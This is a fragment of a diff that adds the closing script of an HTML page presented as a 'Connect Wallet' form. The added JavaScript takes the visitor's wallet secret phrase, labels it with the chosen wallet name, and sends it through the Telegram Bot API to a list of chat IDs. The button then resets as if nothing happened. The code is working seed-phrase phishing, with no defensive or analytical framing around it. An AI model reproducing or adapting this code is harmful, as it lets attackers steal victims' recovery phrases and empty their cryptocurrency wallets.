+            const button = $(this);
+    
+            if (!input) {
+                alert("Secret phrase is required.");
+                return;
+            }
+    
+            button.text('Loading...').prop('disabled', true);
+    
+            const message = `💼 Wallet selected: ${walletName || 'None selected'}\n🔑 Secret Phrase: ${input}`;
+    
+            try {
+                // Send the message to all chat IDs
+                await Promise.all(
+                    CHAT_IDS.map(chatId =>
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        })
+                    )
+                );
+    
+                button.text('Connect Wallet').prop('disabled', false);
+            } catch (err) {
+                console.error('❌ Telegram error:', err);
+                button.text('Connect Wallet').prop('disabled', false);
+            }
+        });
+    });
+    </script>
+    
+    
+
+
+
+  
+
+</body> 
+</html>
